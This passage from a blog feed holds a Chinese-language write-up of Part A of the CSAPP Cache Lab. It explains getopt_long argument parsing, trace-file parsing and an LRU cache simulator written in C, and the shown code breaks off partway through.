    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Cache Lab</title>
    <link href="http://lordaeronesz.github.io/2024/12/17/CSAPP-Cache-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/12/17/CSAPP-Cache-Lab/</id>
    <published>2024-12-17T03:45:11.000Z</published>
    <updated>2024-12-21T05:57:01.061Z</updated>
    
    <content type="html"><![CDATA[<p>本 Lab 主要考察对计算机高速缓存（Cache）机制的理解，以及如何针对 Cache 进行程序的优化，对应知识点为书中的 6.4 ~ 6.6 节内容。</p><span id="more"></span><h1 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>Part A 需要实现一个 Cache 模拟器，能够根据 valgrind 工具所生成的访存跟踪数据，模拟在特定参数的 Cache 环境下的命中（hits）次数、不命中（misses）次数和置换（evictions）次数，目标是实现与 csim-ref 同等的功能。模拟器需要具备的几个功能模块如下：</p><ul><li><p>对命令行参数进行参数解析。</p></li><li><p>读取 trace 文件并解析为地址访问流。</p></li><li><p>定义 Cache 模拟器数据结构，以及相关的函数操作，包括初始化和地址访问。</p></li><li><p>遍历解析出来的地址访问流，依次进行访问模拟，计算得到命中次数等信息。</p></li></ul><p>接下来分别对它们进行介绍。</p><h3 id="命令行参数解析"><a href="#命令行参数解析" class="headerlink" title="命令行参数解析"></a>命令行参数解析</h3><p>根据实验手册的提示，可以使用 <code>getopt</code> 函数进行命令行参数的解析。另外，如果需要支持长选项（形如 <code>--opt arg</code>），则可以使用 GNU C 库提供的扩展版本 <code>getopt_long</code> 函数，其使用方法如下：</p><blockquote><ul><li><strong>generated by GPT4o</strong></li></ul><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><pre class="language-c" data-language="c"><code class="language-c">include <span class="token operator">&lt;</span>getopt<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token keyword">int</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>optstring<span class="token punctuation">,</span>                <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">option</span> <span class="token operator">*</span>longopts<span class="token punctuation">,</span>                <span class="token keyword">int</span> <span class="token operator">*</span>longindex<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><h4 id="1-argc-和-argv"><a href="#1-argc-和-argv" class="headerlink" title="1. argc 和 argv"></a>1. <code>argc</code> 和 <code>argv</code></h4><p>与标准 <code>getopt</code> 相同，分别表示命令行参数的个数和数组。</p><h4 id="2-optstring"><a href="#2-optstring" class="headerlink" title="2. optstring"></a>2. <code>optstring</code></h4><p>一个字符串，表示短选项的格式规则：</p><ul><li>每个选项是一个字符。</li><li>如果选项需要参数，在字符后添加一个冒号（<code>:</code>）。</li><li>如果选项的参数是可选的，在字符后添加两个冒号（<code>::</code>）。</li></ul><h4 id="3-longopts"><a href="#3-longopts" class="headerlink" title="3. longopts"></a>3. <code>longopts</code></h4><p>一个指向 <code>struct option</code> 数组的指针，用于定义长选项。</p><p><code>struct option</code> 定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">option</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span> <span class="token comment">// 长选项的名称</span>    <span class="token keyword">int</span> has_arg<span class="token punctuation">;</span>      <span class="token comment">// 选项是否需要参数（no_argument, required_argument, optional_argument）</span>    <span class="token keyword">int</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span>        <span class="token comment">// 如果为 NULL，则返回值为 val；否则将 *flag 设置为 val 并返回 0</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>          <span class="token comment">// 短选项的字符值或自定义值</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li><code>name</code>：长选项名称，例如 <code>&quot;help&quot;</code> 对应 <code>--help</code>。</li><li><code>has_arg</code>：<ul><li><code>no_argument</code>（0）：无参数。</li><li><code>required_argument</code>（1）：需要参数。</li><li><code>optional_argument</code>（2）：参数可选。</li></ul></li><li><code>flag</code>：<ul><li>如果为 <code>NULL</code>，<code>getopt_long</code> 会返回 <code>val</code> 的值。</li><li>如果非 <code>NULL</code>，<code>getopt_long</code> 会将 <code>*flag</code> 设置为 <code>val</code>，并返回 0。</li></ul></li><li><code>val</code>：指定与该长选项关联的返回值（通常与短选项的字符值一致）。</li></ul><h4 id="4-longindex"><a href="#4-longindex" class="headerlink" title="4. longindex"></a>4. <code>longindex</code></h4><p>指向一个整型变量的指针，用于存储被解析的长选项在 <code>longopts</code> 数组中的索引位置。如果不需要，可以传 <code>NULL</code>。</p><hr><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul><li>返回短选项的字符值，或者由 <code>struct option</code> 中 <code>val</code> 指定的值。</li><li>遇到未知选项时返回 <code>?</code>。</li><li>当没有更多选项时，返回 <code>-1</code>。</li></ul></blockquote><p>根据 <code>getopt_long</code> 的返回值，以及全局变量 <code>optarg</code>，可以对不同的命令行参数进行分发处理。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// 参数定义</span><span class="token keyword">struct</span> <span class="token class-name">option</span> long_options<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#123;</span> <span class="token string">"help"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"verbose"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'v'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"set"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'s'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"lines"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'E'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"block"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token string">"trace"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'t'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 参数解析</span><span class="token keyword">int</span> opt<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"hvs:E:b:t:"</span><span class="token punctuation">,</span> long_options<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token operator">:</span>            <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token operator">:</span>            vflag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>            s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token operator">:</span>            E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token operator">:</span>            b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token operator">:</span>            trace_file <span class="token operator">=</span> optarg<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>            <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="trace-文件解析"><a href="#trace-文件解析" class="headerlink" title="trace 文件解析"></a>trace 文件解析</h3><p>对 trace 文件进行解析，首先读取文件中的每一行操作，对于 operation 为 I 的访存操作，直接跳过不做处理。由于剩余的 M, L, S 操作都满足格式 <code>[space]operation address,size</code>，因此可以直接使用 <code>sscanf</code> 进行解析，提取出各字段。</p><p>对不同操作的处理比较简单：L 和 S 操作需要一次访存，M 操作需要两次访存。</p><blockquote><p>这里我没有考虑一次访存位于多个 Cache 行中的情况，始终视作一次/两次访存，也通过了全部测试样例。</p></blockquote><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    line<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>  <span class="token comment">// 去除尾置换行符</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pline <span class="token operator">=</span> line <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// 去除前导空格</span>    <span class="token keyword">char</span> operation<span class="token punctuation">;</span>    <span class="token keyword">int</span> address<span class="token punctuation">,</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>pline<span class="token punctuation">,</span> <span class="token string">" %c %x,%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Invalid line format: %s\n"</span><span class="token punctuation">,</span> pline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>operation <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="Cache-模拟器数据结构设计"><a href="#Cache-模拟器数据结构设计" class="headerlink" title="Cache 模拟器数据结构设计"></a>Cache 模拟器数据结构设计</h3><p>整个 Cache 模拟器包含 Cache 数据部分、Cache 的参数和命中次数等模拟结果。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> E<span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> set_num<span class="token punctuation">;</span>    CacheSet <span class="token operator">*</span>sets<span class="token punctuation">;</span>    <span class="token keyword">int</span> hit_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> miss_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> evict_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> access_count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> Cache<span class="token punctuation">;</span></code></pre><p>s, E, b 参数即命令行输入的参数。Cache 数据部分可以划分为若干个 Cache 组，组的数量 set_num 等于 $2^s$。</p><p>每个 Cache 组可划分为 E 个 Cache 行。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    CacheLine <span class="token operator">*</span>lines<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheSet<span class="token punctuation">;</span></code></pre><p>而每个 Cache 行包含有效位、tag 和访问位。由于我们只需要统计命中次数等信息，因此在进行访存模拟时，无需实际存储任何数据内容，只需要将有效位置为 1，并更新 tag 和访问位（用于行替换策略）。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">;</span>    <span class="token keyword">int</span> last_used<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheLine<span class="token punctuation">;</span></code></pre><h3 id="地址访问"><a href="#地址访问" class="headerlink" title="地址访问"></a>地址访问</h3><p>根据地址进行模拟访存时，首先需要根据地址 address 获取 Cache 数据中对应的组号 index 和 tag。</p><p><img src="/2024/12/17/CSAPP-Cache-Lab/addr.png" alt></p><p>组号即地址 address 的第 $b$ 到 $b + s$ 位，tag 即地址 address 的高位部分。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">get_cache_parts</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> address<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>tag<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span>index <span class="token operator">=</span> <span class="token punctuation">(</span>address <span class="token operator">>></span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>set_num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>s <span class="token operator">+</span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>得到组号和 tag 后，遍历对应 Cache 组的所有行，进行 tag 的对比。若存在某一行的 tag 与 address 对应的 tag 相同，说明缓存命中，更新 <code>hit_count</code> 次数；否则，缓存不命中，更新 <code>miss_count</code> 次数，并将不命中的内存块写入 Cache 中。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> isHit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 是否命中</span>CacheSet <span class="token operator">*</span>set <span class="token operator">=</span> <span class="token operator">&amp;</span>cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">==</span> tag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        isHit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">++</span>cache<span class="token operator">-></span>hit_count<span class="token punctuation">;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里可能涉及到 Cache 组已满的情况，为此需要进行替换，替换策略采用 LRU 策略，即选取最近最久未被访问过的 Cache 行。为此需要维护访问位，这里为了实现的方便，访问“位” <code>last_used</code> 使用一个整数来存储，其值表示本 Cache 行最近一次访问是整个 Cache 的第 <code>last_used</code> 次访问。因此，<code>last_used</code> 值越小，表示本行最近最久未被访问。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isHit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 未命中</span>    <span class="token operator">++</span>cache<span class="token operator">-></span>miss_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> lru_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// LRU策略选择写入行</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">&lt;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            lru_index <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>cache<span class="token operator">-></span>evict_count<span class="token punctuation">;</span>  <span class="token comment">// 行置换</span>    <span class="token punctuation">&#125;</span>    set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>    set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"cachelab.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;getopt.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> vflag<span class="token punctuation">;</span>  <span class="token comment">// verbose flag</span><span class="token comment">// 根据vflag选择是否打印信息</span><span class="token keyword">void</span> <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>vflag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 缓存行</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">;</span>    <span class="token keyword">int</span> last_used<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheLine<span class="token punctuation">;</span><span class="token comment">// 缓存组</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    CacheLine <span class="token operator">*</span>lines<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheSet<span class="token punctuation">;</span><span class="token comment">// 缓存模拟器</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> E<span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> set_num<span class="token punctuation">;</span>    CacheSet <span class="token operator">*</span>sets<span class="token punctuation">;</span>    <span class="token keyword">int</span> hit_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> miss_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> evict_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> access_count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> Cache<span class="token punctuation">;</span><span class="token comment">// 初始化缓存模拟器</span><span class="token keyword">void</span> <span class="token function">init_cache</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> E<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cache<span class="token operator">-></span>s <span class="token operator">=</span> s<span class="token punctuation">;</span>    cache<span class="token operator">-></span>E <span class="token operator">=</span> E<span class="token punctuation">;</span>    cache<span class="token operator">-></span>b <span class="token operator">=</span> b<span class="token punctuation">;</span>    cache<span class="token operator">-></span>set_num <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">;</span>    cache<span class="token operator">-></span>sets <span class="token operator">=</span> <span class="token punctuation">(</span>CacheSet <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>cache<span class="token operator">-></span>set_num <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CacheSet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>set_num<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">(</span>CacheLine <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>E <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CacheLine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cache<span class="token operator">-></span>hit_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache<span class="token operator">-></span>miss_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache<span class="token operator">-></span>evict_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache<span class="token operator">-></span>access_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取地址对应组号和tag</span><span class="token keyword">void</span> <span class="token function">get_cache_parts</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> address<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>tag<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span>index <span class="token operator">=</span> <span class="token punctuation">(</span>address <span class="token operator">>></span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>set_num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>s <span class="token operator">+</span> cache<span class="token operator">-></span>b<span class="token 